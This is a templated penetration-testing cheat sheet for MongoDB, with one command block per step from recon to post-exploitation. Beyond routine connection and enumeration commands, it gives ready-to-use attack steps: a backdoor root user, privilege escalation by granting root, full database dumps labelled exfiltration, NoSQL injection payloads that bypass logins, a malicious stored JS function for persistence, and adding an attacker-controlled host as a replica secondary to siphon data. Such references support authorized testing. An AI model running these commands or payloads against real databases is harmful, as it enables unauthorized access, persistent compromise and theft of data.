# MongoDB
> NoSQL document database enumeration, exploitation, and post-exploitation
<!-- tags: mongodb,nosql,database,enumeration -->

---

## Discovery - Nmap MongoDB Scripts
Identify MongoDB version and enumerate accessible databases.

```bash
nmap -p 27017 --script mongodb-info,mongodb-databases {{TARGET:ip}}
```

<!-- meta: risk=safe | phase=recon | tags=mongodb,nmap -->

---

## Connect Without Authentication
Test for unauthenticated MongoDB instance access.

```bash
mongo --host {{TARGET:ip}} --port {{PORT:port:27017}}
```

<!-- meta: risk=low | phase=enum | tags=mongodb,unauth,connect -->

---

## Connect With Credentials
Authenticate to MongoDB instance with credentials.

```bash
mongo --host {{TARGET:ip}} --port {{PORT:port:27017}} -u {{USERNAME:str}} -p {{PASSWORD:str}} --authenticationDatabase {{DATABASE:str:admin}}
```

<!-- meta: risk=low | phase=enum | tags=mongodb,auth,connect -->

---

## Connect via Connection String
Connect using MongoDB connection URI.

```bash
mongo mongodb://{{USERNAME:str}}:{{PASSWORD:str}}@{{TARGET:ip}}:{{PORT:port:27017}}/{{DATABASE:str}}
```

<!-- meta: risk=low | phase=enum | tags=mongodb,uri,connect -->

---

## List Databases (Shell)
Enumerate all databases on the server from inside mongo shell.

```javascript
show dbs
db.adminCommand("listDatabases")
```

<!-- meta: risk=low | phase=enum | tags=mongodb,databases,list -->

---

## Enumerate Users and Roles
List users and roles in the current/admin database.

```javascript
use admin
db.getUsers()
db.system.users.find().pretty()
db.getRoles({ showBuiltinRoles: true })
```

<!-- meta: risk=low | phase=enum | tags=mongodb,users,roles -->

---

## List Collections and Read Data
Show collections in current DB and read documents.

```javascript
show collections
db.{{COLLECTION:str:users}}.find().pretty()
```

<!-- meta: risk=low | phase=enum | tags=mongodb,collections,read -->

---

## Connection Status and Current User
Check authenticated user and privileges in current session.

```javascript
db.runCommand({ connectionStatus: 1 })
db.adminCommand({ usersInfo: 1 })
```

<!-- meta: risk=low | phase=enum | tags=mongodb,whoami,session -->

---

## Create Backdoor Admin User
Create a new user with root role in admin DB (requires privileges).

```javascript
use admin
db.createUser({ user: "{{USERNAME:str:backdoor}}", pwd: "{{PASSWORD:str:Pwn3d!}}", roles: [{ role: "root", db: "admin" }] })
```

<!-- meta: risk=critical | phase=post | tags=mongodb,persistence,backdoor -->

---

## Grant Root Role to Existing User
Privilege escalation by granting root role to existing user.

```javascript
db.grantRolesToUser("{{USERNAME:str}}", [ { role: "root", db: "admin" } ])
```

<!-- meta: risk=critical | phase=post | tags=mongodb,privesc,role -->

---

## Mongodump - Full Database Exfil
Dump entire database to disk for offline analysis.

```bash
mongodump --host {{TARGET:ip}} --port {{PORT:port:27017}} -u {{USERNAME:str}} -p {{PASSWORD:str}} --authenticationDatabase admin --out {{OUTDIR:dir:/tmp/dump}}
```

<!-- meta: risk=high | phase=post | tags=mongodb,dump,exfil -->

---

## Mongoexport - Export Collection to JSON
Export a single collection to JSON file.

```bash
mongoexport --host {{TARGET:ip}} --port {{PORT:port:27017}} -u {{USERNAME:str}} -p {{PASSWORD:str}} --authenticationDatabase admin --db {{DATABASE:str}} --collection {{COLLECTION:str}} --out {{OUTFILE:file:dump.json}}
```

<!-- meta: risk=high | phase=post | tags=mongodb,export,json -->

---

## NoSQL Injection - Auth Bypass via $ne
Bypass login with $ne operator (always-true match).

```json
{"username": {"$ne": null}, "password": {"$ne": null}}
```

<!-- meta: risk=high | phase=exploit | tags=nosqli,bypass,auth -->

---

## NoSQL Injection - Regex Wildcard
Bypass authentication using regex match-anything pattern.

```json
{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}
```

<!-- meta: risk=high | phase=exploit | tags=nosqli,regex,bypass -->

---

## NoSQL Injection - $or Logic Abuse
Use $or to satisfy authentication on any matching condition.

```json
{"$or": [{"username": "admin"}, {"username": {"$exists": true}}]}
```

<!-- meta: risk=high | phase=exploit | tags=nosqli,or,bypass -->

---

## Persistent JS Function via system.js
Store malicious server-side JS function for persistence.

```javascript
db.system.js.save({ _id: "evilFunc", value: function() { return "Malicious"; } })
db.loadServerScripts()
```

<!-- meta: risk=critical | phase=post | tags=mongodb,persistence,system.js -->

---

## Replication Pivot - Add Malicious Secondary
Add an attacker-controlled host as replica set secondary to siphon data.

```javascript
rs.conf()
rs.add("{{LHOST:ip}}:27017")
```

<!-- meta: risk=critical | phase=post | tags=mongodb,replication,pivot -->

---

## Check How Mongod Was Started
Inspect process arguments for --auth and --bind_ip misconfigurations.

```bash
ps aux | grep mongod
```

<!-- meta: risk=safe | phase=enum | tags=mongodb,process,config -->
